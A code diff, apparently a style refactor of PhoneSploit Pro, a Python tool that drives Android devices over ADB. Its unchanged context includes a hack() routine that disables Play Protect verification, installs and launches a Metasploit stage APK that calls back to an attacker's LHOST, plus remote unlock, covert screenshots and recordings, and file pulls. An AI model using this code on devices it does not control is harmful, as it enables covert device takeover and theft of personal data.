@@ -66,19 +66,19 @@ def check_packages():
         count = 0  # Count variable for indexing
 
         if adb_status != 0:
-            count = count + 1
+            count += 1
             print(f"{color.YELLOW}{count}. {color.YELLOW}ADB{color.WHITE}")
 
         if metasploit_status != 0:
-            count = count + 1
+            count += 1
             print(f"{color.YELLOW}{count}. Metasploit-Framework{color.WHITE}")
 
         if scrcpy_status != 0:
-            count = count + 1
+            count += 1
             print(f"{color.YELLOW}{count}. Scrcpy{color.WHITE}")
 
         if nmap_status != 0:
-            count = count + 1
+            count += 1
             print(f"{color.YELLOW}{count}. Nmap{color.WHITE}")
 
         print(f"\n{color.CYAN}Please install the above listed software.{color.WHITE}\n")
@@ -86,15 +86,15 @@ def check_packages():
         choice = input(
             f"\n{color.GREEN}Do you still want to continue to PhoneSploit Pro?{color.WHITE}     Y / N > "
         ).lower()
-        if choice == "y" or choice == "":
+        if choice in ["y", ""]:
             return
         elif choice == "n":
             exit_phonesploit_pro()
             return
         else:
-            while choice != "y" and choice != "n" and choice != "":
+            while choice not in ["y", "n", ""]:
                 choice = input("\nInvalid choice!, Press Y or N > ").lower()
-                if choice == "y" or choice == "":
+                if choice in ["y", ""]:
                     return
                 elif choice == "n":
                     exit_phonesploit_pro()
@@ -141,7 +141,7 @@ def connect():
             os.system(
                 "adb kill-server > docs/hidden.txt 2>&1&&adb start-server > docs/hidden.txt 2>&1"
             )
-            os.system("adb connect " + ip + ":5555")
+            os.system(f"adb connect {ip}:5555")
         else:
             print(
                 f"\n{color.RED} Invalid IP Address\n{color.GREEN} Going back to Main Menu{color.WHITE}"
@@ -197,13 +197,13 @@ def get_screenshot():
     choice = input(
         f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
     ).lower()
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         os.system(f"{opener} {screenshot_location}/{file_name}")
 
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
+    elif choice != "n":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 os.system(f"{opener} {screenshot_location}/{file_name}")
 
     print("\n")
@@ -241,13 +241,13 @@ def screenrecord():
     choice = input(
         f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
     ).lower()
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         os.system(f"{opener} {screenrecord_location}/{file_name}")
 
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
+    elif choice != "n":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 os.system(f"{opener} {screenrecord_location}/{file_name}")
     print("\n")
 
@@ -259,9 +259,7 @@ def pull_file():
     )
     location = input("\n> /sdcard/")
     # Checking if specified file or folder exists in Android
-    if os.system(f"adb shell test -e /sdcard/{location}") == 0:
-        pass
-    else:
+    if os.system(f"adb shell test -e /sdcard/{location}") != 0:
         print(
             f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}"
         )
@@ -292,13 +290,13 @@ def pull_file():
     location = file_path[len(file_path) - 1]
 
     # processing request
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         os.system(f"{opener} {pull_location}/{location}")
 
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
+    elif choice != "n":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 os.system(f"{opener} {pull_location}/{location}")
 
 
@@ -317,9 +315,7 @@ def push_file():
             )
         else:
             file_status = os.system(f"test -e {location}")
-        if file_status == 0:
-            pass
-        else:
+        if file_status != 0:
             print(
                 f"{color.RED}\n[Error]{color.GREEN} Specified location does not exist {color.GREEN}"
             )
@@ -327,7 +323,7 @@ def push_file():
         destination = input(
             f"\n{color.CYAN}Enter destination path              {color.YELLOW}Example : /sdcard/Documents{color.WHITE}\n> /sdcard/"
         )
-        os.system("adb push " + location + " /sdcard/" + destination)
+        os.system(f"adb push {location} /sdcard/{destination}")
 
 
 def stop_adb():
@@ -354,8 +350,8 @@ def install_app():
             )
             return
         else:
-            file_location = "'" + file_location + "'"
-            os.system("adb install " + file_location)
+            file_location = f"'{file_location}'"
+            os.system(f"adb install {file_location}")
         print("\n")
 
 
@@ -372,10 +368,8 @@ def uninstall_app():
         # Listing third party apps
         list = os.popen("adb shell pm list packages -3").read().split("\n")
         list.remove("")
-        i = 0
         print("\n")
-        for app in list:
-            i += 1
+        for i, app in enumerate(list, start=1):
             app = app.replace("package:", "")
             print(f"{color.GREEN}{i}.{color.WHITE} {app}")
 
@@ -385,7 +379,7 @@ def uninstall_app():
             if int(app) <= len(list) and int(app) > 0:
                 package = list[int(app) - 1].replace("package:", "")
                 print(f"\n{color.RED}Uninstalling {color.YELLOW}{package}{color.WHITE}")
-                os.system("adb uninstall " + package)
+                os.system(f"adb uninstall {package}")
             else:
                 print(
                     f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
@@ -408,7 +402,7 @@ def uninstall_app():
                 f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
             )
         else:
-            os.system("adb uninstall " + package_name)
+            os.system(f"adb uninstall {package_name}")
     else:
         print(
             f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
@@ -431,10 +425,8 @@ def launch_app():
         # Listing third party apps
         list = os.popen("adb shell pm list packages -3").read().split("\n")
         list.remove("")
-        i = 0
         print("\n")
-        for app in list:
-            i += 1
+        for i, app in enumerate(list, start=1):
             app = app.replace("package:", "")
             print(f"{color.GREEN}{i}.{color.WHITE} {app}")
 
@@ -467,7 +459,7 @@ def launch_app():
             )
             return
 
-    os.system("adb shell monkey -p " + package_name + " 1")
+    os.system(f"adb shell monkey -p {package_name} 1")
     print("\n")
 
 
@@ -484,19 +476,15 @@ def list_apps():
     if mode == "1":
         list = os.popen("adb shell pm list packages -3").read().split("\n")
         list.remove("")
-        i = 0
         print("\n")
-        for app in list:
-            i += 1
+        for i, app in enumerate(list, start=1):
             app = app.replace("package:", "")
             print(f"{color.GREEN}{i}.{color.WHITE} {app}")
     elif mode == "2":
         list = os.popen("adb shell pm list packages").read().split("\n")
         list.remove("")
-        i = 0
         print("\n")
-        for app in list:
-            i += 1
+        for i, app in enumerate(list, start=1):
             app = app.replace("package:", "")
             print(f"{color.GREEN}{i}.{color.WHITE} {app}")
     else:
@@ -511,14 +499,14 @@ def reboot(key):
         f"\n{color.RED}[Warning]{color.YELLOW} Restarting will disconnect the device{color.WHITE}"
     )
     choice = input("\nDo you want to continue?     Y / N > ").lower()
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         pass
     elif choice == "n":
         return
     else:
-        while choice != "y" and choice != "n" and choice != "":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 pass
             elif choice == "n":
                 return
@@ -566,15 +554,11 @@ def instructions():
     os.system(clear)
     print(banner.instructions_banner + banner.instruction)
     choice = input("> ")
-    if choice == "":
-        return True
-    else:
-        return False
+    return choice == ""
 
 
 def hack():
-    continue_hack = instructions()
-    if continue_hack:
+    if continue_hack := instructions():
         os.system(clear)
         ip = get_ip_address()  # getting IP Address to create payload
         lport = "4444"
@@ -590,7 +574,7 @@ def hack():
             ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
             lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
         elif choice != "":
-            while choice != "m" and choice != "":
+            while choice not in ["m", ""]:
                 choice = input(
                     f"\n{color.RED}Invalid selection! , Press 'Enter' OR M > {color.WHITE}"
                 ).lower()
@@ -611,15 +595,9 @@ def hack():
         os.system("adb shell settings put global package_verifier_enable 0")
         os.system("adb shell settings put global verifier_verify_adb_installs 0")
 
-        # installing apk to device
-        if operating_system == "Windows":
-            # (used 'start /b' to execute command in background)
-            # os.system("start /b adb install -r test.apk")
-            os.system("adb install -r test.apk")
-        else:
-            # (used ' &' to execute command in background)
-            # os.system("adb install -r test.apk &")
-            os.system("adb install -r test.apk")
+        # (used 'start /b' to execute command in background)
+        # os.system("start /b adb install -r test.apk")
+        os.system("adb install -r test.apk")
         # time.sleep(5)  # waiting for apk to be installed
 
         # Discarding these steps
@@ -632,7 +610,7 @@ def hack():
         # Keyboard input to accept app install
         print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
         package_name = "com.metasploit.stage"  # payload package name
-        os.system("adb shell monkey -p " + package_name + " 1")
+        os.system(f"adb shell monkey -p {package_name} 1")
         time.sleep(3)  # waiting for app to launch
 
         # Keyboard input to accept app permissions
@@ -784,13 +762,13 @@ def anonymous_screenshot():
     choice = input(
         f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
     ).lower()
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         os.system(f"{opener} {screenshot_location}/{file_name}")
 
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
+    elif choice != "n":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 os.system(f"{opener} {screenshot_location}/{file_name}")
 
     print("\n")
@@ -830,13 +808,13 @@ def anonymous_screenrecord():
     choice = input(
         f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
     ).lower()
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         os.system(f"{opener} {screenrecord_location}/{file_name}")
 
-    elif not choice == "n":
-        while choice != "y" and choice != "n" and choice != "":
+    elif choice != "n":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 os.system(f"{opener} {screenrecord_location}/{file_name}")
     print("\n")
 
@@ -953,8 +931,8 @@ def open_photo():
             )
             return
         else:
-            location = '"' + location + '"'
-            os.system("adb push " + location + " /sdcard/")
+            location = f'"{location}"'
+            os.system(f"adb push {location} /sdcard/")
 
         file_path = location.split("/")
         file_name = file_path[len(file_path) - 1]
@@ -967,7 +945,7 @@ def open_photo():
 
         file_name = file_name.replace("'", "")
         file_name = file_name.replace('"', "")
-        file_name = "'" + file_name + "'"
+        file_name = f"'{file_name}'"
         print(file_name)
         print(f"\n{color.YELLOW}Opening Photo on device        \n{color.WHITE}")
         os.system(
@@ -997,8 +975,8 @@ def open_audio():
             )
             return
         else:
-            location = '"' + location + '"'
-            os.system("adb push " + location + " /sdcard/")
+            location = f'"{location}"'
+            os.system(f"adb push {location} /sdcard/")
 
         file_path = location.split("/")
         file_name = file_path[len(file_path) - 1]
@@ -1012,7 +990,7 @@ def open_audio():
         file_name = file_name.replace("'", "")
         file_name = file_name.replace('"', "")
 
-        file_name = "'" + file_name + "'"
+        file_name = f"'{file_name}'"
         print(file_name)
         print(f"\n{color.YELLOW}Playing Audio on device        \n{color.WHITE}")
         os.system(
@@ -1049,8 +1027,8 @@ def open_video():
             )
             return
         else:
-            location = '"' + location + '"'
-            os.system("adb push " + location + " /sdcard/")
+            location = f'"{location}"'
+            os.system(f"adb push {location} /sdcard/")
 
         file_path = location.split("/")
         file_name = file_path[len(file_path) - 1]
@@ -1063,7 +1041,7 @@ def open_video():
 
         file_name = file_name.replace("'", "")
         file_name = file_name.replace('"', "")
-        file_name = "'" + file_name + "'"
+        file_name = f"'{file_name}'"
         print(file_name)
         print(f"\n{color.YELLOW}Playing Video on device        \n{color.WHITE}")
         os.system(
@@ -1080,19 +1058,19 @@ def open_video():
 
 
 def get_device_info():
-    model = os.popen(f"adb shell getprop ro.product.model").read()
-    manufacturer = os.popen(f"adb shell getprop ro.product.manufacturer").read()
-    chipset = os.popen(f"adb shell getprop ro.product.board").read()
-    android = os.popen(f"adb shell getprop ro.build.version.release").read()
+    model = os.popen("adb shell getprop ro.product.model").read()
+    manufacturer = os.popen("adb shell getprop ro.product.manufacturer").read()
+    chipset = os.popen("adb shell getprop ro.product.board").read()
+    android = os.popen("adb shell getprop ro.build.version.release").read()
     security_patch = os.popen(
-        f"adb shell getprop ro.build.version.security_patch"
+        "adb shell getprop ro.build.version.security_patch"
     ).read()
-    device = os.popen(f"adb shell getprop ro.product.vendor.device").read()
-    sim = os.popen(f"adb shell getprop gsm.sim.operator.alpha").read()
-    encryption_state = os.popen(f"adb shell getprop ro.crypto.state").read()
-    build_date = os.popen(f"adb shell getprop ro.build.date").read()
-    sdk_version = os.popen(f"adb shell getprop ro.build.version.sdk").read()
-    wifi_interface = os.popen(f"adb shell getprop wifi.interface").read()
+    device = os.popen("adb shell getprop ro.product.vendor.device").read()
+    sim = os.popen("adb shell getprop gsm.sim.operator.alpha").read()
+    encryption_state = os.popen("adb shell getprop ro.crypto.state").read()
+    build_date = os.popen("adb shell getprop ro.build.date").read()
+    sdk_version = os.popen("adb shell getprop ro.build.version.sdk").read()
+    wifi_interface = os.popen("adb shell getprop wifi.interface").read()
 
     print(
         f"""
@@ -1112,7 +1090,7 @@ def get_device_info():
 
 
 def battery_info():
-    battery = os.popen(f"adb shell dumpsys battery").read()
+    battery = os.popen("adb shell dumpsys battery").read()
     print(
         f"""\n{color.YELLOW}Battery Information :
 {color.WHITE}{battery}\n"""
@@ -1148,7 +1126,7 @@ def unlock_device():
     )
     os.system("adb shell input keyevent 26")
     os.system("adb shell input swipe 200 900 200 300 200")
-    if not password == "":  # if password is not blank
+    if password != "":  # if password is not blank
         os.system(f'adb shell input text "{password}"')
     os.system("adb shell input keyevent 66")
     print(f"{color.GREEN}\nDevice unlocked{color.WHITE}")
@@ -1237,10 +1215,8 @@ def extract_apk():
         # Listing third party apps
         list = os.popen("adb shell pm list packages -3").read().split("\n")
         list.remove("")
-        i = 0
         print("\n")
-        for app in list:
-            i += 1
+        for i, app in enumerate(list, start=1):
             app = app.replace("package:", "")
             print(f"{color.GREEN}{i}.{color.WHITE} {app}")
 
@@ -1329,20 +1305,20 @@ def mirror():
     elif mode == "3":
         print(f"\n{color.CYAN}Enter size limit {color.YELLOW}(e.g. 1024){color.WHITE}")
         size = input("> ")
-        if not size == "":
-            size = "-m " + size
+        if size != "":
+            size = f"-m {size}"
 
         print(
             f"\n{color.CYAN}Enter bit-rate {color.YELLOW}(e.g. 2)   {color.WHITE}(Default : 8 Mbps)"
         )
         bitrate = input("> ")
-        if not bitrate == "":
-            bitrate = "-b " + bitrate + "M"
+        if bitrate != "":
+            bitrate = f"-b {bitrate}M"
 
         print(f"\n{color.CYAN}Enter frame-rate {color.YELLOW}(e.g. 15){color.WHITE}")
         framerate = input("> ")
-        if not framerate == "":
-            framerate = "--max-fps=" + framerate
+        if framerate != "":
+            framerate = f"--max-fps={framerate}"
 
         os.system(f"scrcpy {size} {bitrate} {framerate}")
     else:
@@ -1358,18 +1334,18 @@ def power_off():
         f"\n{color.RED}[Warning]{color.YELLOW} Powering off device will disconnect the device{color.WHITE}"
     )
     choice = input("\nDo you want to continue?     Y / N > ").lower()
-    if choice == "y" or choice == "":
+    if choice in ["y", ""]:
         pass
     elif choice == "n":
         return
     else:
-        while choice != "y" and choice != "n" and choice != "":
+        while choice not in ["y", "n", ""]:
             choice = input("\nInvalid choice!, Press Y or N > ").lower()
-            if choice == "y" or choice == "":
+            if choice in ["y", ""]:
                 pass
             elif choice == "n":
                 return
-    os.system(f"adb shell reboot -p")
+    os.system("adb shell reboot -p")
     print("\n")
 
 
@@ -1528,7 +1504,6 @@ def main():
 # Starting point of the program
 
 # Global variables
-run_phonesploit_pro = True
 operating_system = ""
 clear = "clear"
 opener = "xdg-open"
@@ -1546,7 +1521,7 @@ selected_banner = random.choice(color.color_list) + random.choice(banner.banner_
 
 start()
 
-if run_phonesploit_pro:
+if run_phonesploit_pro := True:
     clear_screen()
     while run_phonesploit_pro:
         try:
